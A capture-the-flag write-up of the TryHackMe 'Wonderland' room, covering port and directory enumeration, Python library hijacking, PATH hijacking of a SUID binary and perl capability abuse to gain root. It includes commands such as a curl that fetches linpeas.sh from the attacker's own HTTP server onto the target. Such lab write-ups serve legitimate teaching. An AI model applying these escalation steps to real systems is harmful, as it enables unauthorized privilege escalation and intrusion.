Room: [Wonderland](https://tryhackme.com/room/wonderland)

Difficulty: Medium

Overview: This room is really interesting has you are going to exploit diferent types of privilege escalations, from PATH hijacking, scripting, analyzing binaries and setuid capabilities will make escalate horizontaly from user to user till you get to root!

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

We start enumerating the machine by running nmap. 

Nmap is a free and open source utility for network discovery and security auditing. With this tool we can search for open ports on a target machine.

**nmap -sV -sC -p- 10.10.189.225 -oN nmap.txt**

-sV    →  Probe open ports to determine service

-sC    →  Scan using the default set of scripts

-p-    →  Scan all ports

-oN    →  Save the ouput of the scan in a file

![nmap](https://user-images.githubusercontent.com/76821053/120692473-b7f40980-c49f-11eb-982b-ebe00cb8f77a.png)

There are two open ports on the system:

22 →  OpenSSH 7.6p1 Ubuntu 

80 →  Golang net/http server

Since there is a http server running on the system we can take a look at it:

![httphome](https://user-images.githubusercontent.com/76821053/120692565-d78b3200-c49f-11eb-8ead-c1b985a7d705.png)

After searching the webpage and its source code page i found nothing. So there is a tool called “Gobuster” which can help us search for hidden directories or files in http servers:

**gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://10.10.189.225 -x .txt,.cgi,.php,.log,.bak,.xxx,.old**

dir             → Uses directory/file enumeration mode

--wordlist      → Path to wordslist 

--url           → specifies the path of the target url we want to find any hidden directories

-x              → Search for all files with the specified extentions 

![gobuster_r](https://user-images.githubusercontent.com/76821053/120692664-fc7fa500-c49f-11eb-8f64-f80ed0af4e7b.png)

We found a new directory:

![httphome](https://user-images.githubusercontent.com/76821053/120692711-0c978480-c4a0-11eb-9c06-7a6c5b320787.png)

After reading the “Keep going” tip, i ran “Gobuster” again and found another directory:

![gobuster_a](https://user-images.githubusercontent.com/76821053/120692819-2df87080-c4a0-11eb-9b62-3ac1c16100d9.png)

So if we pay close attention to where this is leading us, we can figure it out, or else we can always keep going with “Gobuster”.

We arrived at the path **"/r/a/b/b/i/t"**:

![http_rabbit](https://user-images.githubusercontent.com/76821053/120692924-4cf70280-c4a0-11eb-8dbc-855abf925ed2.png)

In the source code of the webpage there are credentials for connecting to the target machine through ssh.

![http_source](https://user-images.githubusercontent.com/76821053/120693064-7748c000-c4a0-11eb-9570-425f75026a74.png)

We have access to the target machine with user "Alice":

![ssh_alice](https://user-images.githubusercontent.com/76821053/120693141-8d568080-c4a0-11eb-9499-54b91b12833b.png)

When enumerating the machine in search for the flags, we can see that The flag “root.txt” is in “alice” home directory which is odd.

![ls_la_alice](https://user-images.githubusercontent.com/76821053/120693204-a2331400-c4a0-11eb-9b9a-2518386f5302.png)

After checking the hint given by the room “Everthing is upside down here” i tried to access /root.

![ls_root](https://user-images.githubusercontent.com/76821053/120693289-bd9e1f00-c4a0-11eb-8ad7-c1fcbe77d01e.png)

This is very strange since we cannot list any files in here, but still i manage to have access to /root directory. 

So taking a wild guess from the tips of the room we can try to read "user.txt" inside /root and find the first flag!

![cat_user txt](https://user-images.githubusercontent.com/76821053/120693405-deff0b00-c4a0-11eb-85aa-6cb6886e0b78.png)

In order to elevate our privileges we can check "sudo -l":

![sudo_l](https://user-images.githubusercontent.com/76821053/120693519-0229ba80-c4a1-11eb-8a03-e3ae516d5721.png)

To exploit this permission given to “alice” and gain access to user "rabbit" we can check a usefull post on medium about python library hijacking:

You can check it out here:

https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8

The script "walrus_and_the_carpenter.py" imports a module called random.

![script_walrus](https://user-images.githubusercontent.com/76821053/120693624-22597980-c4a1-11eb-96c5-a66b7a9e997e.png)

The random module is located in one of the defined python paths, but if python finds a module with the same name in a folder with higher priority, it will import that module instead of the “legit” one.

So if we try and create a “random.py” script that runs /bin/bash inside the same directory of “walrus_and_the_carpenter.py”. Maybe “walrus_and_the_carpenter.py” will call for this module instead of the defined python module paths.

Simple random.py script:

![simple_random](https://user-images.githubusercontent.com/76821053/120693774-592f8f80-c4a1-11eb-8bff-7b539b7fce35.png)

List the contents of the directory to make sure the scripts are in the same directory:

![list_folder_scripts](https://user-images.githubusercontent.com/76821053/120693870-76645e00-c4a1-11eb-98c6-2f6c1042ccac.png)

Now we just need to run the "sudo -l" command with "alice".

Note that we need to specify user “rabbit” since he is the one with sudo permissions to run that python script.

![alice_rabbit_privesc](https://user-images.githubusercontent.com/76821053/120694022-a3187580-c4a1-11eb-91db-e588c5e36d84.png)

Success we are now user “rabbit”, the script “walrus_and_the_carpenter.py" imported our “random.py” and ran it.

To further our privileges we will try to take advantage of a binary inside “rabbit” home directory:

![teaParty_rabbit](https://user-images.githubusercontent.com/76821053/120694146-c3e0cb00-c4a1-11eb-985b-a51767144fd0.png)

Run the binary:

![run_teaparty](https://user-images.githubusercontent.com/76821053/120694189-d22ee700-c4a1-11eb-87a3-2e60f53a814b.png)

The binary “teaParty” has SUID permissions, and to be able to read its contents we need to transfer it to our system, since we cannot run strings on the target machine.

To transfer the file to our system we need to change “rabbit” home directory permissions to "rwx (or 777)" for all users since we don't have "rabbit's" ssh password.

![chmod_rabbit](https://user-images.githubusercontent.com/76821053/120694580-4ff2f280-c4a2-11eb-8107-e1065ce3a692.png)

From our machine we can run scp to download the file:

**scp alice@10.10.189.225:/home/rabbit/teaParty .**

![scp](https://user-images.githubusercontent.com/76821053/120694668-65681c80-c4a2-11eb-834b-15c31407b75f.png)

Now we gonna analyse the binary with "strings":

![strings_teaparty](https://user-images.githubusercontent.com/76821053/120694782-7f096400-c4a2-11eb-9419-da455c3d53f8.png)

We can see that the binary runs “/bin/echo” and also runs “date” but it don't specify the absolute path for "date".

This is another privilege escalation method here, we will take advantage of the SUID binary teaParty!

We have to create a small “date” bash script that calls for /bin/bash and export $PATH to one specified by us and take advange of “date” not having a absolute path.

![script_date](https://user-images.githubusercontent.com/76821053/120694943-ab24e500-c4a2-11eb-840e-5bf411021bbf.png)

Need to make “date” executable:

![chmod_date](https://user-images.githubusercontent.com/76821053/120694982-b9730100-c4a2-11eb-8d83-dbcebea4f85d.png)

Now just export the variable $PATH and run the binary:

![export_PATH](https://user-images.githubusercontent.com/76821053/120695104-e8897280-c4a2-11eb-8e86-803d5f22d0d4.png)

We manage the move horizontaly to another user and there is credentials in plain text in his home directory:

![hatter_creds](https://user-images.githubusercontent.com/76821053/120695203-0bb42200-c4a3-11eb-8772-8a03cfac1fc1.png)

I had a hard time with the user “hatter” in finding the last privilege escalation into “root” user.

we can use a tool called "[linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)" to automaticaly enumerate the system.

Now to upload the tool to the target system we need to started a python http server and use curl.

On our machine we setup the server where we host the “linpeas.sh” script:

**python -m SimpleHTTPServer**

![python_http](https://user-images.githubusercontent.com/76821053/120695863-c2180700-c4a3-11eb-85ee-d2251510af65.png)

From the target machine we will use curl:

**curl http://yourmachineip:8000/linpeas.sh -o linpeas.sh**

![curl_linpeas](https://user-images.githubusercontent.com/76821053/120695950-dcea7b80-c4a3-11eb-9a9c-44494c7f634c.png)

We need to make “linpeas.sh” executable:

![chmod_linpeas](https://user-images.githubusercontent.com/76821053/120695996-ed9af180-c4a3-11eb-80b8-592be139a4c2.png)

When running “linpeas.sh” i manage to found and interesting setuid binary capabilities:

![lin_capabilities](https://user-images.githubusercontent.com/76821053/120696069-03101b80-c4a4-11eb-8f58-114ca4412c41.png)

The root user (or any ID with UID of 0) gets a special privileges running processes. The kernel and applications are usually programmed to skip the restriction of some activities when seeing this user ID. 

More info on setuid capabilities can be found [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities).

I searched [GTFOBINS](https://gtfobins.github.io/gtfobins/perl/) and learned that **/usr/bin/perl** is found vulnerable to privesc.

![gtfobins](https://user-images.githubusercontent.com/76821053/120696194-2a66e880-c4a4-11eb-8d16-93fec8b6cf26.png)

Now to elevate our privileges to root we just need to execute this command:

![privesc_cat_root](https://user-images.githubusercontent.com/76821053/120696264-410d3f80-c4a4-11eb-877f-f4f6289e54c3.png)

Success! We found our last flag!














